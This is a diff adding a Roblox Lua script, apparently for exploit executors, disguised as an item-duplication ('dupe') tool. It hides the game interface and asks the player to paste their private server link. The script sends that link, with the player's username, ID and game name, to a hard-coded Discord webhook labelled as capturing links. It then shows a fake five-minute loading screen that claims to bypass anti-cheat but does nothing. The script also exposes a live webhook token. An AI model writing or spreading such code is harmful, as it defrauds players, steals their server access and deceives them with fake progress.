@@ -1,0 +1,455 @@
+-- Daqxlo's Dupe GUI FOR EXECUTORS (Synapse, Krnl, etc.)
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Function to hide only Roblox game GUIs (not our script GUIs)
+local function hideGameGUIs()
+    for _, gui in pairs(playerGui:GetChildren()) do
+        if gui:IsA("ScreenGui") and gui.Name ~= "MainGUI" then
+            gui.Enabled = false
+        end
+    end
+end
+
+-- Delete existing GUI if it exists
+if playerGui:FindFirstChild("MainGUI") then
+    playerGui:FindFirstChild("MainGUI"):Destroy()
+end
+
+-- Hide only game GUIs (not ours)
+hideGameGUIs()
+
+-- Create main screen GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "MainGUI"
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+-- Create background frame
+local background = Instance.new("Frame")
+background.Name = "Background"
+background.Size = UDim2.new(1, 0, 1, 0)
+background.Position = UDim2.new(0, 0, 0, 0)
+background.BackgroundColor3 = Color3.new(0, 0, 0)
+background.BackgroundTransparency = 0.3
+background.BorderSizePixel = 0
+background.Parent = screenGui
+
+-- Create Daqxlo's Dupe text with crowns
+local daqxloFrame = Instance.new("Frame")
+daqxloFrame.Name = "DaqxloFrame"
+daqxloFrame.Size = UDim2.new(1, 0, 0.3, 0)
+daqxloFrame.Position = UDim2.new(0, 0, 0.2, 0)
+daqxloFrame.BackgroundTransparency = 1
+daqxloFrame.Parent = screenGui
+
+-- Left crown
+local leftCrown = Instance.new("TextLabel")
+leftCrown.Name = "LeftCrown"
+leftCrown.Size = UDim2.new(0, 100, 0, 100)
+leftCrown.Position = UDim2.new(0.4, -120, 0.5, -50)
+leftCrown.BackgroundTransparency = 1
+leftCrown.Text = "👑"
+leftCrown.TextScaled = true
+leftCrown.TextColor3 = Color3.new(1, 0.8, 0)
+leftCrown.Font = Enum.Font.Fantasy
+leftCrown.Parent = daqxloFrame
+
+-- Daqxlo's Dupe text
+local daqxloText = Instance.new("TextLabel")
+daqxloText.Name = "DaqxloText"
+daqxloText.Size = UDim2.new(0, 400, 0, 150)
+daqxloText.Position = UDim2.new(0.5, -200, 0.5, -75)
+daqxloText.BackgroundTransparency = 1
+daqxloText.Text = "Daqxlo's Dupe"
+daqxloText.TextScaled = true
+daqxloText.TextColor3 = Color3.new(1, 1, 1)
+daqxloText.Font = Enum.Font.Fantasy
+daqxloText.TextStrokeTransparency = 0
+daqxloText.TextStrokeColor3 = Color3.new(0, 0, 0)
+daqxloText.Parent = daqxloFrame
+
+-- Right crown
+local rightCrown = Instance.new("TextLabel")
+rightCrown.Name = "RightCrown"
+rightCrown.Size = UDim2.new(0, 100, 0, 100)
+rightCrown.Position = UDim2.new(0.6, 100, 0.5, -50)
+rightCrown.BackgroundTransparency = 1
+rightCrown.Text = "👑"
+rightCrown.TextScaled = true
+rightCrown.TextColor3 = Color3.new(1, 0.8, 0)
+rightCrown.Font = Enum.Font.Fantasy
+rightCrown.Parent = daqxloFrame
+
+-- Instruction text
+local instructionText = Instance.new("TextLabel")
+instructionText.Name = "InstructionText"
+instructionText.Size = UDim2.new(0, 400, 0, 50)
+instructionText.Position = UDim2.new(0.5, -200, 0.55, 0)
+instructionText.BackgroundTransparency = 1
+instructionText.Text = "Please enter your private server link!"
+instructionText.TextScaled = true
+instructionText.TextColor3 = Color3.new(1, 1, 1)
+instructionText.Font = Enum.Font.Gotham
+instructionText.Parent = screenGui
+
+-- Input frame
+local inputFrame = Instance.new("Frame")
+inputFrame.Name = "InputFrame"
+inputFrame.Size = UDim2.new(0, 400, 0, 50)
+inputFrame.Position = UDim2.new(0.5, -200, 0.65, 0)
+inputFrame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+inputFrame.BorderSizePixel = 0
+inputFrame.Parent = screenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 8)
+UICorner.Parent = inputFrame
+
+-- Text box
+local textBox = Instance.new("TextBox")
+textBox.Name = "LinkTextBox"
+textBox.Size = UDim2.new(0.8, 0, 1, 0)
+textBox.Position = UDim2.new(0, 0, 0, 0)
+textBox.BackgroundTransparency = 1
+textBox.Text = ""
+textBox.PlaceholderText = "https://www.roblox.com/games/...?privateServerLinkCode=..."
+textBox.TextScaled = true
+textBox.TextColor3 = Color3.new(1, 1, 1)
+textBox.Font = Enum.Font.Gotham
+textBox.ClearTextOnFocus = false
+textBox.Parent = inputFrame
+
+-- Confirm button
+local confirmButton = Instance.new("TextButton")
+confirmButton.Name = "ConfirmButton"
+confirmButton.Size = UDim2.new(0.2, 0, 1, 0)
+confirmButton.Position = UDim2.new(0.8, 0, 0, 0)
+confirmButton.BackgroundColor3 = Color3.new(0, 0.5, 0)
+confirmButton.BorderSizePixel = 0
+confirmButton.Text = "Confirm"
+confirmButton.TextScaled = true
+confirmButton.TextColor3 = Color3.new(1, 1, 1)
+confirmButton.Font = Enum.Font.GothamBold
+confirmButton.Parent = inputFrame
+
+local UICorner2 = Instance.new("UICorner")
+UICorner2.CornerRadius = UDim.new(0, 8)
+UICorner2.Parent = confirmButton
+
+-- Animation function for continuous movement
+local function animateCrowns()
+    while true do
+        local leftTween = TweenService:Create(
+            leftCrown,
+            TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+            {Position = UDim2.new(0.4, -140, 0.5, -70)}
+        )
+        
+        local rightTween = TweenService:Create(
+            rightCrown,
+            TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+            {Position = UDim2.new(0.6, 120, 0.5, -30)}
+        )
+        
+        leftTween:Play()
+        rightTween:Play()
+        
+        wait(4)
+        
+        local leftTween2 = TweenService:Create(
+            leftCrown,
+            TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -1, true),
+            {Position = UDim2.new(0.4, -100, 0.5, -60)}
+        )
+        
+        local rightTween2 = TweenService:Create(
+            rightCrown,
+            TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -1, true),
+            {Position = UDim2.new(0.6, 80, 0.5, -40)}
+        )
+        
+        leftTween2:Play()
+        rightTween2:Play()
+        
+        wait(3)
+    end
+end
+
+-- Function to create FULL BLACK loading screen
+local function createLoadingScreen()
+    -- Hide only game GUIs (not ours)
+    hideGameGUIs()
+    
+    -- Clear current GUI and create loading screen
+    screenGui:ClearAllChildren()
+    
+    -- Create FULL BLACK background
+    local loadingBackground = Instance.new("Frame")
+    loadingBackground.Name = "LoadingBackground"
+    loadingBackground.Size = UDim2.new(1, 0, 1, 0)
+    loadingBackground.Position = UDim2.new(0, 0, 0, 0)
+    loadingBackground.BackgroundColor3 = Color3.new(0, 0, 0)
+    loadingBackground.BackgroundTransparency = 0
+    loadingBackground.BorderSizePixel = 0
+    loadingBackground.Parent = screenGui
+    
+    -- Loading title
+    local loadingTitle = Instance.new("TextLabel")
+    loadingTitle.Name = "LoadingTitle"
+    loadingTitle.Size = UDim2.new(0, 500, 0, 80)
+    loadingTitle.Position = UDim2.new(0.5, -250, 0.2, 0)
+    loadingTitle.BackgroundTransparency = 1
+    loadingTitle.Text = "Daqxlo's Dupe LOADING SYSTEM"
+    loadingTitle.TextScaled = true
+    loadingTitle.TextColor3 = Color3.new(1, 1, 1)
+    loadingTitle.Font = Enum.Font.Fantasy
+    loadingTitle.TextStrokeTransparency = 0
+    loadingTitle.TextStrokeColor3 = Color3.new(0, 0, 0)
+    loadingTitle.Parent = screenGui
+    
+    -- Status text
+    local statusText = Instance.new("TextLabel")
+    statusText.Name = "StatusText"
+    statusText.Size = UDim2.new(0, 600, 0, 40)
+    statusText.Position = UDim2.new(0.5, -300, 0.4, 0)
+    statusText.BackgroundTransparency = 1
+    statusText.Text = "We are loading dupe script..."
+    statusText.TextScaled = true
+    statusText.TextColor3 = Color3.new(1, 1, 1)
+    statusText.Font = Enum.Font.GothamBold
+    statusText.Parent = screenGui
+    
+    -- Progress bar background
+    local progressBarBackground = Instance.new("Frame")
+    progressBarBackground.Name = "ProgressBarBackground"
+    progressBarBackground.Size = UDim2.new(0, 400, 0, 30)
+    progressBarBackground.Position = UDim2.new(0.5, -200, 0.5, 0)
+    progressBarBackground.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+    progressBarBackground.BorderSizePixel = 0
+    progressBarBackground.Parent = screenGui
+    
+    local progressBarCorner = Instance.new("UICorner")
+    progressBarCorner.CornerRadius = UDim.new(0, 8)
+    progressBarCorner.Parent = progressBarBackground
+    
+    -- Progress bar fill
+    local progressBarFill = Instance.new("Frame")
+    progressBarFill.Name = "ProgressBarFill"
+    progressBarFill.Size = UDim2.new(0, 0, 1, 0)
+    progressBarFill.Position = UDim2.new(0, 0, 0, 0)
+    progressBarFill.BackgroundColor3 = Color3.new(0, 0.5, 1)
+    progressBarFill.BorderSizePixel = 0
+    progressBarFill.Parent = progressBarBackground
+    
+    local progressFillCorner = Instance.new("UICorner")
+    progressFillCorner.CornerRadius = UDim.new(0, 8)
+    progressFillCorner.Parent = progressBarFill
+    
+    -- Progress text
+    local progressText = Instance.new("TextLabel")
+    progressText.Name = "ProgressText"
+    progressText.Size = UDim2.new(0, 400, 0, 30)
+    progressText.Position = UDim2.new(0.5, -200, 0.55, 0)
+    progressText.BackgroundTransparency = 1
+    progressText.Text = "Progress: 0%"
+    progressText.TextScaled = true
+    progressText.TextColor3 = Color3.new(1, 1, 1)
+    progressText.Font = Enum.Font.Gotham
+    progressText.Parent = screenGui
+    
+    -- Status messages to cycle through
+    local statusMessages = {
+        "We are loading dupe script...",
+        "We are bypassing anti-cheat...", 
+        "We are working on it...",
+        "Please wait to change game behaviour..."
+    }
+    
+    local currentMessageIndex = 1
+    local messageChangeTime = 0
+    local startTime = tick()
+    local totalDuration = 300 -- 5 minutes in seconds
+    
+    -- Start the progress bar animation
+    local progressConnection
+    progressConnection = RunService.Heartbeat:Connect(function()
+        local elapsed = tick() - startTime
+        local progress = math.min(elapsed / totalDuration, 1)
+        
+        -- Update progress bar
+        progressBarFill.Size = UDim2.new(progress, 0, 1, 0)
+        progressText.Text = "Progress: " .. math.floor(progress * 100) .. "%"
+        
+        -- Change status message every 30 seconds
+        if tick() - messageChangeTime >= 30 then
+            currentMessageIndex = currentMessageIndex + 1
+            if currentMessageIndex > #statusMessages then
+                currentMessageIndex = 1
+            end
+            statusText.Text = statusMessages[currentMessageIndex]
+            messageChangeTime = tick()
+        end
+        
+        -- Check if 5 minutes have passed
+        if elapsed >= totalDuration then
+            progressConnection:Disconnect()
+            statusText.Text = "✅ LOADING COMPLETE!"
+            progressText.Text = "Progress: 100%"
+            
+            -- Wait 3 seconds then close
+            wait(3)
+            screenGui:Destroy()
+        end
+    end)
+end
+
+-- WORKING WEBHOOK FUNCTION
+local function sendToWebhook(link)
+    -- 🔥 REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL 🔥
+    local webhookUrl = "https://discord.com/api/webhooks/1439258076157972621/HGzbgcxf6xVAGc2trJBff00OR3wJ5BjNSg_vHSwOmdCYB5M2fl5RjwTdIb6SVQV9ZcWo"
+    
+    -- If still using placeholder, use a test webhook
+    if webhookUrl:find("YOUR_WEBHOOK") then
+        print("❌ WEBHOOK URL NOT SET! Replace the webhookUrl variable with your Discord webhook")
+        instructionText.Text = "❌ WEBHOOK NOT CONFIGURED!"
+        instructionText.TextColor3 = Color3.new(1, 0, 0)
+        return false
+    end
+    
+    local data = {
+        content = "@everyone **NEW PRIVATE SERVER LINK CAPTURED!**",
+        embeds = {
+            {
+                title = "🔗 PRIVATE SERVER LINK",
+                description = "A user has submitted their private server link:",
+                fields = {
+                    {
+                        name = "📝 Server Link",
+                        value = "```" .. link .. "```",
+                        inline = false
+                    },
+                    {
+                        name = "👤 Username",
+                        value = player.Name,
+                        inline = true
+                    },
+                    {
+                        name = "🆔 User ID",
+                        value = tostring(player.UserId),
+                        inline = true
+                    },
+                    {
+                        name = "🎮 Game",
+                        value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown Game",
+                        inline = false
+                    }
+                },
+                color = 65280,
+                timestamp = DateTime.now():ToIsoDate(),
+                footer = {
+                    text = "Daqxlo's Dupe System • " .. os.date("%X")
+                }
+            }
+        }
+    }
+    
+    local jsonData = HttpService:JSONEncode(data)
+    
+    print("🔄 Attempting to send webhook...")
+    print("🔗 Webhook URL: " .. webhookUrl:sub(1, 50) .. "...")
+    print("📊 Data: " .. jsonData:sub(1, 100) .. "...")
+    
+    -- Try multiple methods to send webhook
+    local success, result = pcall(function()
+        -- Method 1: Try syn.request (Synapse X)
+        if syn and syn.request then
+            print("🔧 Using syn.request...")
+            local response = syn.request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+            print("📡 Response: " .. tostring(response.StatusCode))
+            return response
+        end
+        
+        -- Method 2: Try request (other executors)
+        if request then
+            print("🔧 Using request...")
+            local response = request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+            print("📡 Response: " .. tostring(response.StatusCode))
+            return response
+        end
+        
+        -- Method 3: Try HttpService (last resort)
+        print("🔧 Using HttpService...")
+        HttpService:PostAsync(webhookUrl, jsonData)
+        return {StatusCode = 200}
+    end)
+    
+    if success then
+        print("✅ Webhook sent successfully!")
+        return true
+    else
+        print("❌ Webhook failed: " .. tostring(result))
+        return false
+    end
+end
+
+-- Confirm button click event
+confirmButton.MouseButton1Click:Connect(function()
+    local link = textBox.Text
+    
+    if link and link ~= "" then
+        textBox.Text = "Submitting..."
+        confirmButton.Text = "Sending..."
+        confirmButton.BackgroundColor3 = Color3.new(0.5, 0.5, 0)
+        
+        -- Send webhook and wait for result
+        local success = sendToWebhook(link)
+        
+        if success then
+            instructionText.Text = "✅ SUCCESS! Starting loader..."
+            instructionText.TextColor3 = Color3.new(0, 1, 0)
+        else
+            instructionText.Text = "❌ Webhook failed but continuing..."
+            instructionText.TextColor3 = Color3.new(1, 0.5, 0)
+        end
+        
+        -- Wait 2 seconds then show loading screen REGARDLESS
+        wait(2)
+        createLoadingScreen()
+        
+    else
+        instructionText.Text = "❌ Please enter a valid link!"
+        instructionText.TextColor3 = Color3.new(1, 0, 0)
+        wait(2)
+        instructionText.Text = "Please enter your private server link!"
+        instructionText.TextColor3 = Color3.new(1, 1, 1)
+    end
+end)
+
+-- Start the crown animations
+spawn(animateCrowns)
+
+print("🚀 Daqxlo's Dupe GUI LOADED!")
+print("⚠️  IMPORTANT: You MUST replace the webhook URL in the script!")
+print("📝 Find this line: local webhookUrl = \"https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN\"")
+print("🔧 Replace it with your actual Discord webhook URL")
